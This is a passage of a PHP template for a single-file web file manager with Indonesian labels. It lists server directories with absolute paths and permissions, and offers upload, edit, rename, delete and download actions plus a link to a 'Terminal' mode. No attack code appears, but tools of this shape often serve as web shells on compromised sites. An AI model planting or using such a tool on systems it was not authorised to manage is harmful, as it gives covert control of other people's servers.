        <a href="<?=h(fm_url(array('a'=>'terminal','d'=>$rel)))?>" class="term">⌨ Terminal</a>
    <?php endif; ?>
    <a href="?logout=1" class="logout" onclick="return confirm('Logout?')">Logout</a>
</header>

<div class="locbar">
    <span>📍 Lokasi:</span>
    <code id="abspath" title="<?=h($dirAbs)?>"><?=h($dirAbs)?>/</code>
    <button type="button" class="copy" onclick="navigator.clipboard.writeText('<?=h($dirAbs)?>').then(()=>{this.textContent='✓';setTimeout(()=>this.textContent='Copy',1200)})">Copy</button>
</div>

<div class="wrap">

    <?php if ($flash): ?>
        <div class="flash <?=$flash['t'] === 'err' ? 'err' : 'ok'?>"><?=h($flash['m'])?></div>
    <?php endif; ?>

    <div class="toolbar">
        <form method="post" enctype="multipart/form-data" action="<?=h(fm_url(array('d'=>$rel,'a'=>'list')))?>">
            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
            <input type="hidden" name="act" value="upload">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
        <form method="post" action="<?=h(fm_url(array('d'=>$rel,'a'=>'list')))?>">
            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
            <input type="hidden" name="act" value="mkdir">
            <input type="text" name="name" placeholder="nama-folder" required>
            <button type="submit">+ Folder</button>
        </form>
    </div>

    <table>
        <thead>
            <tr>
                <th style="width:55%">Nama</th>
                <th style="width:12%">Ukuran</th>
                <th style="width:18%">Diubah</th>
                <th style="width:15%">Aksi</th>
            </tr>
        </thead>
        <tbody>
        <?php if ($parentRel !== null): ?>
            <tr>
                <td colspan="4">
                    <a class="name" href="<?=h(fm_url(array('a'=>'list','d'=>$parentRel)))?>">
                        <span class="icon">📁</span> ..
                    </a>
                </td>
            </tr>
        <?php endif; ?>

        <?php if (empty($dirs) && empty($files)): ?>
            <tr><td colspan="4" class="empty">Folder kosong.</td></tr>
        <?php endif; ?>

        <?php foreach ($dirs as $d):
            $abs = $dirAbs . '/' . $d;
            $childRel = $rel === '' ? $d : $rel . '/' . $d;
            $mtime = @filemtime($abs);
        ?>
            <tr class="dir">
                <td>
                    <a class="name" href="<?=h(fm_url(array('a'=>'list','d'=>$childRel)))?>" title="<?=h($abs)?>/">
                        <span class="icon">📁</span> <?=h($d)?>
                    </a>
                </td>
                <td>—</td>
                <td><?=$mtime ? date('Y-m-d H:i', $mtime) : '—'?></td>
                <td>
                    <div class="actions">
                        <form class="form-inline" method="post" action="<?=h(fm_url(array('d'=>$rel,'a'=>'list')))?>" onsubmit="var n=this.newname.value.trim(); if(!n)return false; if(!confirm('Rename folder?'))return false; return true;">
                            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
                            <input type="hidden" name="act" value="rename">
                            <input type="hidden" name="file" value="<?=h($childRel)?>">
                            <input type="text" name="newname" value="<?=h($d)?>" size="10">
                            <button type="submit">Rename</button>
                        </form>
                        <form class="form-inline" method="post" action="<?=h(fm_url(array('d'=>$rel,'a'=>'list')))?>" onsubmit="return confirm('Hapus folder <?=h(addslashes($d))?> beserta isinya?')">
                            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
                            <input type="hidden" name="act" value="delete">
                            <input type="hidden" name="file" value="<?=h($childRel)?>">
                            <button type="submit" class="danger">Hapus</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>

        <?php foreach ($files as $f):
            $abs = $dirAbs . '/' . $f;
            $size = @filesize($abs);
            $mtime = @filemtime($abs);
            $fileRel = $rel === '' ? $f : $rel . '/' . $f;
        ?>
            <tr>
                <td>
                    <a class="name" href="<?=h(fm_url(array('a'=>'edit','f'=>$fileRel)))?>" title="<?=h($abs)?>">
                        <span class="icon">📄</span> <?=h($f)?>
                    </a>
                </td>
                <td><?=$size !== false ? fm_size($size) : '—'?></td>
                <td><?=$mtime ? date('Y-m-d H:i', $mtime) : '—'?></td>
                <td>
                    <div class="actions">
                        <a href="<?=h(fm_url(array('a'=>'edit','f'=>$fileRel)))?>">Edit</a>
                        <a href="<?=h(fm_url(array('a'=>'download','f'=>$fileRel)))?>">Download</a>
                        <form class="form-inline" method="post" action="<?=h(fm_url(array('d'=>$rel,'a'=>'list')))?>" onsubmit="var n=this.newname.value.trim(); if(!n)return false; if(!confirm('Rename file?'))return false; return true;">
                            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
                            <input type="hidden" name="act" value="rename">
                            <input type="hidden" name="file" value="<?=h($fileRel)?>">
                            <input type="text" name="newname" value="<?=h($f)?>" size="10">
                            <button type="submit">Rename</button>
                        </form>
                        <form class="form-inline" method="post" action="<?=h(fm_url(array('d'=>$rel,'a'=>'list')))?>" onsubmit="return confirm('Hapus <?=h(addslashes($f))?>?')">
                            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
                            <input type="hidden" name="act" value="delete">
                            <input type="hidden" name="file" value="<?=h($fileRel)?>">
                            <button type="submit" class="danger">Hapus</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>

    <p style="color:#555;font-size:11px;margin-top:20px">
        Root: <?=h(fm_root())?> · Permissions: <?=substr(sprintf('%o', @fileperms($dirAbs)), -4)?>
    </p>
</div>

</body></html>